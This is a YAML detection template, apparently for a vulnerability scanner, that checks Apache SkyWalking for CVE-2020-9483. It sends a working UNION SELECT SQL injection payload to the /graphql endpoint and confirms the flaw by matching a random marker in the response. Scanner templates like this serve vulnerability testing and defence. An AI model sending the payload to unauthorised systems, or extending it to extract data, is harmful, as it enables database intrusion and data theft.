id: CVE-2020-9483

info:
  name: SkyWalking SQLI
  author: pikpikcu
  severity: high
  description: |
    When using H2/MySQL/TiDB as Apache SkyWalking storage and a metadata query through GraphQL protocol, there is a SQL injection vulnerability which allows access to unexpected data. Apache SkyWalking 6.0.0 to 6.6.0, 7.0.0 H2/MySQL/TiDB storage implementations don't use the appropriate way to set SQL parameters.
  reference:
    - https://github.com/apache/skywalking/pull/4639
    - https://nvd.nist.gov/vuln/detail/CVE-2020-9483
    - https://github.com/Elsfa7-110/kenzer-templates
    - https://github.com/developer3000S/PoC-in-GitHub
    - https://github.com/pen4uin/awesome-vulnerability-research
  tags: cve,cve2020,sqli,skywalking,apache

set:
  r1: randomInt(10000, 99999)
rules:
  r0:
    request:
      method: POST
      path: /graphql
      headers:
        Content-Type: application/json
      body: |
        {"query":"query SQLi($d: Duration!){globalP99:getLinearIntValues(metric: {name:\"all_p99\",id:\"') UNION SELECT 1,CONCAT('~','{{r1}}','~')-- \",}, duration: $d){values{value}}}","variables":{"d":{"start":"2021-11-11","end":"2021-11-12","step":"DAY"}}}
    expression: response.status == 200 && response.body.bcontains(bytes("~" + string(r1) + "~"))
expression: r0()
